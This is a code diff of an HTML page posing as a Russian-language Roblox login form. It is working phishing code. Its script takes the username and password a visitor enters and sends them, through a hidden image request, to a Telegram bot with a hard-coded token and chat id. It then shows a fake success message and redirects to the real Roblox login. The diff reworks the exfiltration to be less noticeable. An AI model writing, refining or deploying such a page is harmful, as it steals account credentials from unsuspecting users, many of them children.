@@ -1,4 +1,4 @@
-      <!DOCTYPE html>
+  <!DOCTYPE html>
 <html>
 <head>
     <title>Roblox - Вход</title>
@@ -24,35 +24,23 @@
     </div>
     <script>
         function send() {
-    let u = document.getElementById('user').value;
-    let p = document.getElementById('pass').value;
-    if (u === '' || p === '') {
-        alert('Заполните все поля!');
-        return;
-    }
-
-    let token = "8847775639:AAFbsxzyX_5_arZ65JJv8lhzYxuuJiUj7xQ";
-    let chat_id = 6929974696;
-    let message = "Логин: " + u + " | Пароль: " + p;
-
-    let img = new Image();
-    img.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
-
-    alert('Вход выполнен успешно!');
-    window.location = 'https://www.roblox.com/login';
-}
+            let u = document.getElementById('user').value;
+            let p = document.getElementById('pass').value;
+            if (u === '' || p === '') {
+                alert('Заполните все поля!');
+                return;
+            }
 
             let token = "8847775639:AAFbsxzyX_5_arZ65J1v81hzYxuuJ1uJ7xQ";
             let chat_id = 6929974696;
             let message = "Логин: " + u + " | Пароль: " + p;
 
-            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
-                .then(() => {
-                    alert('Вход выполнен успешно!');
-                    window.location = 'https://www.roblox.com/login';
-                })
-                .catch(() => alert('Ошибка, попробуйте позже'));
+            let img = new Image();
+            img.src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`;
+
+            alert('Вход выполнен успешно!');
+            window.location = 'https://www.roblox.com/login';
         }
     </script>
 </body>
-</html>     
+</html>  
